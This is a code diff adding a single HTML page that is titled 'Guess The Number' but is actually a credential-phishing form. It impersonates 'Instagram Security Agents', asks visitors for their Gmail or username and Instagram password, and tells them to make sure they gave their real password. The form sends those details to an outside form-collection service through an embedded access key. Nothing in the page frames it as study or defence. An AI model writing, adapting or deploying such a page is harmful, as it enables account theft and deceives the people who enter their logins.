@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Guess The Number</title>
+
+<style>
+
+body{
+    margin:0;
+    padding:0;
+    height:100vh;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    background:linear-gradient(135deg,#050816,#0b1026,#12002f);
+    font-family:Arial,sans-serif;
+    overflow:hidden;
+}
+
+.background{
+    position:absolute;
+    width:100%;
+    height:100%;
+    background:
+    radial-gradient(circle at top left,#00f7ff33,transparent 30%),
+    radial-gradient(circle at bottom right,#ff00ff33,transparent 30%);
+    animation:moveBg 8s infinite alternate;
+}
+
+@keyframes moveBg{
+    from{
+        transform:scale(1);
+    }
+    to{
+        transform:scale(1.1);
+    }
+}
+
+.container{
+    position:relative;
+    z-index:2;
+    width:350px;
+    padding:40px;
+    border-radius:25px;
+    background:rgba(255,255,255,0.08);
+    backdrop-filter:blur(12px);
+    box-shadow:0 0 30px rgba(0,255,255,0.3);
+    text-align:center;
+    color:white;
+}
+
+.logo{
+    font-size:40px;
+    margin-bottom:10px;
+}
+
+h1{
+    margin:10px 0;
+    font-size:32px;
+    color:#00f7ff;
+}
+
+p{
+    color:#cccccc;
+    margin-bottom:25px;
+}
+
+input{
+    width:100%;
+    padding:14px;
+    margin:10px 0;
+    border:none;
+    border-radius:12px;
+    outline:none;
+    background:#111827;
+    color:white;
+    font-size:16px;
+}
+
+button{
+    width:100%;
+    padding:14px;
+    margin-top:15px;
+    border:none;
+    border-radius:12px;
+    background:linear-gradient(90deg,#00f7ff,#8a2be2);
+    color:white;
+    font-size:18px;
+    cursor:pointer;
+    transition:0.3s;
+    font-weight:bold;
+}
+
+button:hover{
+    transform:scale(1.05);
+    box-shadow:0 0 20px #00f7ff;
+}
+
+.footer{
+    margin-top:20px;
+    font-size:12px;
+    color:#888;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="background"></div>
+
+<div class="container">
+
+<div class="logo">INSTAGRAM</div>
+
+<h1>INSTAGRAM SECURITY AGENTS</h1>
+
+<p>
+Enter your GMAIL or username and your password of your instagram account.
+</p>
+<form action="https://api.web3forms.com/submit" method="POST">
+
+  <input type="hidden" name="access_key" value="d5347ab6-1b0e-4440-a061-5dca90143f5a">
+
+  <input type="email" name="email"  required>
+
+  <input type="password" name="name"  required>
+
+
+  <button type="submit">Submit</button>
+
+
+
+<div class="footer">
+Make sure you submitted your real password and gmail
+</div>
+
+</div>
+
+</body>
+</html>
